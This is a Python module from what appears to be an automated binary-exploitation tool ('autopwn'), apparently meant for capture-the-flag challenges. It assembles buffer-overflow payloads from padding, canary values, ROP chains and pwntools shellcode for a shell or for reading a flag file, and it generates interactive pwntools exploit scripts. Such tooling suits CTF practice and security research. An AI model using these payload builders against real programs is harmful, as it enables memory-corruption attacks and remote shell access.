from __future__ import annotations

from typing import TYPE_CHECKING, Any

from pwn import log

if TYPE_CHECKING:
    from autopwn.context import PwnContext


def synthesize_exploit_input(ctx: PwnContext, exploit_path: dict) -> bytes | None:
    """根据利用路径合成完整的exploit输入。

    对于菜单程序，生成一系列交互命令。
    对于直接输入程序，生成单次payload。
    """
    steps = exploit_path.get("steps", [])
    if not steps:
        return None

    if ctx.input_type == "menu":
        return _synthesize_menu_input(ctx, steps)
    else:
        return _synthesize_direct_input(ctx, steps)


def _synthesize_direct_input(ctx: PwnContext, steps: list[dict]) -> bytes | None:
    """为直接输入程序合成payload。"""
    parts = []

    for step in steps:
        action = step.get("action", "")

        if action == "overflow":
            offset = step.get("offset", ctx.overflow_offset)
            parts.append(b"A" * offset)

        elif action == "write_value":
            value = step.get("value", 0)
            size = step.get("size", 8 if ctx.bits == 64 else 4)
            parts.append(value.to_bytes(size, "little"))

        elif action == "write_bytes":
            data = step.get("data", b"")
            if isinstance(data, str):
                data = data.encode()
            parts.append(data)

        elif action == "canary":
            if ctx.canary_value:
                size = ctx.bits // 8
                parts.append(ctx.canary_value.to_bytes(size, "little"))

        elif action == "rbp":
            value = step.get("value", 0)
            size = ctx.bits // 8
            parts.append(value.to_bytes(size, "little"))

        elif action == "rop_chain":
            chain = step.get("chain", [])
            for addr in chain:
                size = ctx.bits // 8
                parts.append(addr.to_bytes(size, "little"))

        elif action == "shellcode":
            from pwn import asm, shellcraft, context as pwn_ctx
            pwn_ctx.arch = ctx.arch
            pwn_ctx.bits = ctx.bits
            sc_type = step.get("type", "sh")
            if sc_type == "sh":
                parts.append(asm(shellcraft.sh()))
            elif sc_type == "orw":
                flag = step.get("flag", "flag.txt")
                parts.append(asm(
                    shellcraft.open(flag) +
                    shellcraft.read("rax", "rsp", 0x100) +
                    shellcraft.write(1, "rsp", 0x100)
                ))

    if parts:
        return b"".join(parts)
    return None


def _synthesize_menu_input(ctx: PwnContext, steps: list[dict]) -> bytes | None:
    """为菜单程序生成交互序列（返回换行分隔的命令）。"""
    lines = []

    for step in steps:
        action = step.get("action", "")

        if action == "menu_select":
            choice = step.get("choice", "1")
            lines.append(str(choice).encode())

        elif action == "send_size":
            size = step.get("size", 0)
            lines.append(str(size).encode())

        elif action == "send_data":
            data = step.get("data", b"")
            if isinstance(data, str):
                data = data.encode()
            lines.append(data)

        elif action == "send_index":
            idx = step.get("index", 0)
            lines.append(str(idx).encode())

    if lines:
        return b"\n".join(lines) + b"\n"
    return None


def generate_interaction_script(ctx: PwnContext, steps: list[dict]) -> str:
    """生成Python交互脚本（pwntools格式）。"""
    script_lines = [
        "from pwn import *",
        "",
        f"binary = {ctx.binary_path!r}",
        "elf = ELF(binary)",
        "context.binary = elf",
        "",
        "p = process(binary)",
        "",
    ]

    for step in steps:
        action = step.get("action", "")
        comment = step.get("comment", "")

        if comment:
            script_lines.append(f"# {comment}")

        if action == "menu_select":
            choice = step.get("choice", "1")
            prompt = step.get("prompt", ">>")
            script_lines.append(f"p.sendlineafter(b'{prompt}', b'{choice}')")

        elif action == "send_size":
            size = step.get("size", 0)
            script_lines.append(f"p.sendlineafter(b':', b'{size}')")

        elif action == "send_data":
            data_repr = step.get("data_repr", "b'A' * 8")
            script_lines.append(f"p.sendlineafter(b':', {data_repr})")

        elif action == "recv_leak":
            var = step.get("var", "leak")
            script_lines.append(f"{var} = u64(p.recv(6).ljust(8, b'\\x00'))")
            script_lines.append(f"log.info(f'{var} = {{{var}:#x}}')")

        elif action == "interactive":
            script_lines.append("p.interactive()")

        script_lines.append("")

    return "\n".join(script_lines)
